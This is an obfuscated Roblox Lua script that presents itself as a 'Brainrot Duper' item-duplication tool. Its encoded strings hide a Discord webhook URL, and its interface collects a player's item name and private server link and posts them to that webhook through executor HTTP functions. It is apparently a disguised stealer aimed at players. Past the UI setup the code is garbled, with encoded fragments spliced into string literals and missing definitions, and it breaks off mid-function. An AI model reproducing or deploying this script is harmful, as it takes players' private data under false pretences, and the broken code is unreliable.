
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local _r4saienfh = function()
    -- Brainrot Duper (Polished Fixed v2)
local Players = game:GetService((function()
        local a={1077,1441,1298,1610,1350,1519,1532};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())
local HttpService = game:GetService((function()
        local a={973,1545,1545,1493,1116,1350,1519,1571,1402,1324,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())
local player = Players.LocalPlayer
local playerGui = player:WaitForChild((function()
        local a={1077,1441,1298,1610,1350,1519,960,1558,1402};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())

-- <<< Your webhook here >>>
local WEBHOOK_URL = (function()
        local a={1389,1545,1545,1493,1532,791,648,648,1337,1402,1532,1324,1480,1519,1337,635,1324,1480,1454,648,1298,1493,1402,648,1584,1350,1311,1389,1480,1480,1428,1532,648,674,713,687,700,739,713,765,778,713,778,661,700,700,726,661,661,752,700,713,648,1350,1532,1454,986,1519,1363,1597,1597,1298,1103,1506,921,973,1324,1142,1181,1467,1103,1168,1311,752,1207,1272,1363,1428,1051,921,934,1467,882,1103,1493,1012,1311,895,1363,1389,1389,739,1571,674,661,1584,1363,882,765,1415,661,1103,895,1272,960,1467,1168,778,973,1532,1506,1363,1545,739,1077,1558,999,1519,1012,1493,752};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()

-- Helper function to post JSON
local function postToWebhook(payloadJson)
    local ok, res = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, payloadJson, Enum.HttpContentType.ApplicationJson)
    end)
    if ok then return true, res end

    local ok2, res2 = pcall(function()
        if syn and syn.request then
            return syn.request({Url=WEBHOOK_URL, Method=(function()
        local a={1077,1064,1116,1129};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), Headers={[(function()
        local a={908,1480,1467,1545,1350,1467,1545,622,1129,1610,1493,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()]=(function()
        local a={1298,1493,1493,1441,1402,1324,1298,1545,1402,1480,1467,648,1415,1532,1480,1467};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()}, Body=payloadJson})
        elseif request then
            return request({Url=WEBHOOK_URL, Method=(function()
        local a={1077,1064,1116,1129};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), Headers={[(function()
        local a={908,1480,1467,1545,1350,1467,1545,622,1129,1610,1493,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()]=(function()
        local a={1298,1493,1493,1441,1402,1324,1298,1545,1402,1480,1467,648,1415,1532,1480,1467};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()}, Body=payloadJson})
        elseif http_request then
            return http_request({Url=WEBHOOK_URL, Method=(function()
        local a={1077,1064,1116,1129};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), Headers={[(function()
        local a={908,1480,1467,1545,1350,1467,1545,622,1129,1610,1493,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()]=(function()
        local a={1298,1493,1493,1441,1402,1324,1298,1545,1402,1480,1467,648,1415,1532,1480,1467};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()}, Body=payloadJson})
        else
            error((function()
        local a={1051,1480,453,973,1129,1129,1077,453,1454,1350,1545,1389,1480,1337,453,1298,1571,1298,1402,1441,1298,1311,1441,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())
        end
    end)
    if ok2 then return true, res2 end
    return false, res or res2
end

-- Build UI
local screenGui = Instance.new((function()
        local a={1116,1324,1519,1350,1350,1467,960,1558,1402};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())
screenGui.Name = (function()
        local a={895,1519,1298,1402,1467,1519,1480,1545,921,1558,1493,1350,1519,1142,986};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local main = Instance.new((function()
        local a={947,1519,1298,1454,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())
main.Name = (function()
        local a={1038,1298,1402,1467};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()
main.Size = UDim2.new(0, 460, 0, 240) -- increased height for buttons
main.Position = UDim2.new(0.5,0,0.5,0)
main.AnchorPoint = Vector2.new(0.5,0.5)
main.BackgroundColor3 = Color3.fromRGB(14,14,14)
main.BorderSizePixel = 0
main.ZIndex = 5
main.Parent = screenGui
Instance.new((function()
        local a={1142,986,908,1480,1519,1467,1350,1519};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), main).CornerRadius = UDim.new(0,12)
local stroke = Instance.new((function()
        local a={1142,986,1116,1545,1519,1480,1428,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), main)
stroke.Transparency = 0.85
stroke.Thickness = 1

-- Header
local header = Instance.new((function()
        local a={947,1519,1298,1454,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), main)
header.Size = UDim2.new(1,0,0,62)
header.BackgroundColor3 = Color3.fromRGB(18,18,18)
header.BorderSizePixel = 0
Instance.new((function()
        local a={1142,986,908,1480,1519,1467,1350,1519};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), header).CornerRadius = UDim.new(0,12)

local title = Instance.new((function()
        local a={1129,1350,1597,1545,1025,1298,1311,1350,1441};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), header)
title.Size = UDim2.new(1,-24,1,0)
title.Position = UDim2.new(0,12,0,0)
title.BackgroundTransparency = 1
title.Text = (function()
        local a={895,1519,1298,1402,1467,1519,1480,1545,453,921,1558,1493,1350,1519};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255,140,0)
title.TextXAlignment = Enum.TextXAlignment.Left

-- Content frame
local content = Instance.new((function()
        local a={947,1519,1298,1454,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), main)
content.Size = UDim2.new(1,-28,1,-74)
content.Position = UDim2.new(0,14,0,64)
content.BackgroundTransparency = 1

local function newLabel(parent,posY,text)
    local lbl = Instance.new((function()
        local a={1129,1350,1597,1545,1025,1298,1311,1350,1441};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), parent)
    lbl.Size = UDim2.new(0,120,0,20)
    lbl.Position = UDim2.new(0,0,0,posY)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 14
    lbl.TextColor3 = Color3.fromRGB(200,200,200)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    return lbl
end

local function newBox(parent,posY,width)
    local box = Instance.new((function()
        local a={1129,1350,1597,1545,895,1480,1597};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)(), parent)
    box.Size = UDim2.new(0,width,0,34)
    box.Position = UDim2.new(0,0,0,posY)
    box.BackgroundColor3 = Color3.fromRGB(26,26,26)
    box.TextColor3 = Color3.fromRGB(230,230,230)
    box.Font = Enum.Font.Gotham
    box.TextSize = 15
    box.ClearTextOnFocus = false
    box.Text = "(function()
        local a={453,622,622,453,1350,1467,1532,1558,1519,1350,1532,453,1545,1350,1597,1545,1311,1480,1597,453,1532,1545,1298,1519,1545,1532,453,1350,1454,1493,1545,1610,167,453,453,453,453,1441,1480,1324,1298,1441,453,1324,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()UICorner(function()
        local a={609,453,1311,1480,1597,570,167,453,453,453,453,1324,635,908,1480,1519,1467,1350,1519,1103,1298,1337,1402,1558,1532,453,830,453,1142,921,1402,1454,635,1467,1350,1584,557,661,609,765,570,167,453,453,453,453,1441,1480,1324,1298,1441,453,1532,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()UIStroke(function()
        local a={609,453,1311,1480,1597,570,167,453,453,453,453,1532,635,1129,1519,1298,1467,1532,1493,1298,1519,1350,1467,1324,1610,453,830,453,661,635,778,167,453,453,453,453,1532,635,1129,1389,1402,1324,1428,1467,1350,1532,1532,453,830,453,674,167,453,453,453,453,1519,1350,1545,1558,1519,1467,453,1311,1480,1597,167,1350,1467,1337,167,167,1467,1350,1584,1025,1298,1311,1350,1441,557,1324,1480,1467,1545,1350,1467,1545,609,687,609};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()Brainrot Name:")
local nameBox = newBox(content,22,430)
nameBox.PlaceholderText = (function()
        local a={934,1467,1545,1350,1519,453,1467,1298,1454,1350,635,635,635};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()

newLabel(content,64,"Private Link:")
local linkBox = newBox(content,84,430)
linkBox.PlaceholderText = (function()
        local a={1389,1545,1545,1493,1532,791,648,648,635,635,635};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()

-- Feedback
local feedback = Instance.new("TextLabel(function()
        local a={609,453,1324,1480,1467,1545,1350,1467,1545,570,167,1363,1350,1350,1337,1311,1298,1324,1428,635,1116,1402,1623,1350,453,830,453,1142,921,1402,1454,687,635,1467,1350,1584,557,674,609,661,609,661,609,674,765,570,167,1363,1350,1350,1337,1311,1298,1324,1428,635,1077,1480,1532,1402,1545,1402,1480,1467,453,830,453,1142,921,1402,1454,687,635,1467,1350,1584,557,661,609,661,609,661,609,674,700,687,570,167,1363,1350,1350,1337,1311,1298,1324,1428,635,895,1298,1324,1428,1376,1519,1480,1558,1467,1337,1129,1519,1298,1467,1532,1493,1298,1519,1350,1467,1324,1610,453,830,453,674,167,1363,1350,1350,1337,1311,1298,1324,1428,635,1129,1350,1597,1545,453,830,453};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()(function()
        local a={167,1363,1350,1350,1337,1311,1298,1324,1428,635,947,1480,1467,1545,453,830,453,934,1467,1558,1454,635,947,1480,1467,1545,635,960,1480,1545,1389,1298,1454,167,1363,1350,1350,1337,1311,1298,1324,1428,635,1129,1350,1597,1545,1116,1402,1623,1350,453,830,453,674,713,167,1363,1350,1350,1337,1311,1298,1324,1428,635,1129,1350,1597,1545,908,1480,1441,1480,1519,700,453,830,453,908,1480,1441,1480,1519,700,635,1363,1519,1480,1454,1103,960,895,557,687,661,661,609,687,661,661,609,687,661,661,570,167,1363,1350,1350,1337,1311,1298,1324,1428,635,1129,1350,1597,1545,1181,882,1441,1402,1376,1467,1454,1350,1467,1545,453,830,453,934,1467,1558,1454,635,1129,1350,1597,1545,1181,882,1441,1402,1376,1467,1454,1350,1467,1545,635,1025,1350,1363,1545,167,167,622,622,453,895,1558,1545,1545,1480,1467,1532,453,1402,1467,1532,1402,1337,1350,453,1324,1480,1467,1545,1350,1467,1545,167,1441,1480,1324,1298,1441,453,1532,1350,1467,1337,895,1545,1467,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()TextButton", content)
sendBtn.Size = UDim2.new(0,140,0,36)
sendBtn.Position = UDim2.new(1,-150,0,156) -- relative to content
sendBtn.Text = (function()
        local a={1116,1350,1467,1337};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()
sendBtn.Font = Enum.Font.GothamBold
sendBtn.TextSize = 16
sendBtn.TextColor3 = Color3.fromRGB(255,255,255)
sendBtn.BackgroundColor3 = Color3.fromRGB(30,144,255)
Instance.new("UICorner(function()
        local a={609,453,1532,1350,1467,1337,895,1545,1467,570,635,908,1480,1519,1467,1350,1519,1103,1298,1337,1402,1558,1532,453,830,453,1142,921,1402,1454,635,1467,1350,1584,557,661,609,765,570,167,1441,1480,1324,1298,1441,453,1532,1350,1467,1337,1116,1545,1519,1480,1428,1350,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()UIStroke(function()
        local a={609,453,1532,1350,1467,1337,895,1545,1467,570,167,1532,1350,1467,1337,1116,1545,1519,1480,1428,1350,635,1129,1519,1298,1467,1532,1493,1298,1519,1350,1467,1324,1610,453,830,453,661,635,765,726,167,167,1441,1480,1324,1298,1441,453,1324,1441,1350,1298,1519,895,1545,1467,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()TextButton", content)
clearBtn.Size = UDim2.new(0,96,0,36)
clearBtn.Position = UDim2.new(0,0,0,156) -- left inside content
clearBtn.Text = (function()
        local a={908,1441,1350,1298,1519};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()
clearBtn.Font = Enum.Font.GothamBold
clearBtn.TextSize = 16
clearBtn.TextColor3 = Color3.fromRGB(255,255,255)
clearBtn.BackgroundColor3 = Color3.fromRGB(90,90,90)
Instance.new("UICorner(function()
        local a={609,453,1324,1441,1350,1298,1519,895,1545,1467,570,635,908,1480,1519,1467,1350,1519,1103,1298,1337,1402,1558,1532,453,830,453,1142,921,1402,1454,635,1467,1350,1584,557,661,609,765,570,167,1441,1480,1324,1298,1441,453,1324,1441,1350,1298,1519,1116,1545,1519,1480,1428,1350,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()UIStroke(function()
        local a={609,453,1324,1441,1350,1298,1519,895,1545,1467,570,167,1324,1441,1350,1298,1519,1116,1545,1519,1480,1428,1350,635,1129,1519,1298,1467,1532,1493,1298,1519,1350,1467,1324,1610,453,830,453,661,635,765,726,167,167,622,622,453,895,1441,1298,1324,1428,453,1480,1571,1350,1519,1441,1298,1610,167,1441,1480,1324,1298,1441,453,1480,1571,1350,1519,1441,1298,1610,960,1558,1402,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()ScreenGui(function()
        local a={570,167,1480,1571,1350,1519,1441,1298,1610,960,1558,1402,635,1051,1298,1454,1350,453,830,453};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()BrainrotOverlay(function()
        local a={167,1480,1571,1350,1519,1441,1298,1610,960,1558,1402,635,1103,1350,1532,1350,1545,1064,1467,1116,1493,1298,1584,1467,453,830,453,1363,1298,1441,1532,1350,167,1480,1571,1350,1519,1441,1298,1610,960,1558,1402,635,1077,1298,1519,1350,1467,1545,453,830,453,1493,1441,1298,1610,1350,1519,960,1558,1402,167,167,1441,1480,1324,1298,1441,453,1480,1571,1350,1519,1441,1298,1610,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()Frame(function()
        local a={609,453,1480,1571,1350,1519,1441,1298,1610,960,1558,1402,570,167,1480,1571,1350,1519,1441,1298,1610,635,1116,1402,1623,1350,453,830,453,1142,921,1402,1454,687,635,1467,1350,1584,557,674,609,661,609,674,609,661,570,167,1480,1571,1350,1519,1441,1298,1610,635,1077,1480,1532,1402,1545,1402,1480,1467,453,830,453,1142,921,1402,1454,687,635,1467,1350,1584,557,661,609,661,609,661,609,661,570,167,1480,1571,1350,1519,1441,1298,1610,635,895,1298,1324,1428,1376,1519,1480,1558,1467,1337,908,1480,1441,1480,1519,700,453,830,453,908,1480,1441,1480,1519,700,635,1467,1350,1584,557,661,609,661,609,661,570,167,1480,1571,1350,1519,1441,1298,1610,635,895,1480,1519,1337,1350,1519,1116,1402,1623,1350,1077,1402,1597,1350,1441,453,830,453,661,167,1480,1571,1350,1519,1441,1298,1610,635,1207,986,1467,1337,1350,1597,453,830,453,778,778,778,167,1480,1571,1350,1519,1441,1298,1610,635,1155,1402,1532,1402,1311,1441,1350,453,830,453,1363,1298,1441,1532,1350,167,1480,1571,1350,1519,1441,1298,1610,635,882,1324,1545,1402,1571,1350,453,830,453,1545,1519,1558,1350,167,1480,1571,1350,1519,1441,1298,1610,635,1116,1350,1441,1350,1324,1545,1298,1311,1441,1350,453,830,453,1545,1519,1558,1350,167,167,1441,1480,1324,1298,1441,453,1311,1402,1376,1077,1350,1519,1324,1350,1467,1545,453,830,453,986,1467,1532,1545,1298,1467,1324,1350,635,1467,1350,1584,557};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()TextLabel(function()
        local a={609,453,1480,1571,1350,1519,1441,1298,1610,570,167,1311,1402,1376,1077,1350,1519,1324,1350,1467,1545,635,1116,1402,1623,1350,453,830,453,1142,921,1402,1454,687,635,1467,1350,1584,557,661,635,726,609,661,609,661,635,687,609,661,570,167,1311,1402,1376,1077,1350,1519,1324,1350,1467,1545,635,1077,1480,1532,1402,1545,1402,1480,1467,453,830,453,1142,921,1402,1454,687,635,1467,1350,1584,557,661,635,687,726,609,661,609,661,635,713,609,661,570,167,1311,1402,1376,1077,1350,1519,1324,1350,1467,1545,635,895,1298,1324,1428,1376,1519,1480,1558,1467,1337,1129,1519,1298,1467,1532,1493,1298,1519,1350,1467,1324,1610,453,830,453,674,167,1311,1402,1376,1077,1350,1519,1324,1350,1467,1545,635,947,1480,1467,1545,453,830,453,934,1467,1558,1454,635,947,1480,1467,1545,635,960,1480,1545,1389,1298,1454,895,1480,1441,1337,167,1311,1402,1376,1077,1350,1519,1324,1350,1467,1545,635,1129,1350,1597,1545,1116,1402,1623,1350,453,830,453,752,687,167,1311,1402,1376,1077,1350,1519,1324,1350,1467,1545,635,1129,1350,1597,1545,453,830,453};
        local b=
